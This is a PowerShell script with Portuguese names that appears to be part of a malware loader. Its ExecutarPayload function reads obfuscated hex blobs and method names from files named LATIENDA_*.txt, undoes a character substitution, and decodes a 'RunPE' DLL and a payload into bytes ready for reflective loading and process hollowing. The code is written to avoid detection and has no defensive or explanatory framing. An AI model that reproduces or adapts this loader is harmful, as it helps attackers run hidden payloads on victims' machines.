Function ConverterBinarioParaTexto($entrada) {
    $entrada = $entrada.Trim()
    $listaBytes = [System.Collections.Generic.List[Byte]]::new()
    for ($i = 0; $i -lt $entrada.Length; $i += 8) {
        $listaBytes.Add([Convert]::ToByte($entrada.Substring($i, 8), 2))
    }
    return [System.Text.Encoding]::ASCII.GetString($listaBytes.ToArray())
}
Function HexParaBytes($entrada) {
    $entrada = $entrada.Trim()
    return ($entrada -split '(..)' | Where-Object {$_}) | ForEach-Object { [Convert]::ToByte($_, 16) }
}
Function ExecutarPayload {

    $mensagemCodificada = (Get-Content ($pastaPublica + "LATIENDA_msg.txt") -Raw).Trim() -replace "%","0" -replace "!","1" -replace "@","A"
    $codigoRunPE = (Get-Content ($pastaPublica + "LATIENDA_runpe.txt") -Raw).Trim() -replace "%","0" -replace "!","1" -replace "@","A"
    try {
        [byte[]]$mensagemBytes = HexParaBytes $mensagemCodificada
        [byte[]]$dllBytes = HexParaBytes $codigoRunPE
        $nomeMetodoLoad   = (Get-Content ($pastaPublica + "LATIENDA_load.txt") -Raw).Trim()
        $nomeMetodoTipo   = (Get-Content ($pastaPublica + "LATIENDA_type.txt") -Raw).Trim()
        $parametroClasse  = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_xx.txt") -Raw)
        $nomeMetodoExec   = (Get-Content ($pastaPublica + "LATIENDA_method.txt") -Raw).Trim()
        $parametroMetodo  = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_Execute.txt") -Raw)
        $nomeInvoke       = (Get-Content ($pastaPublica + "LATIENDA_invoke.txt") -Raw).Trim()
        $paramFramework   = ConverterBinarioParaTexto (Get-Content ($pastaPublica + "LATIENDA_Framework.txt") -Raw)

    } catch {}
}
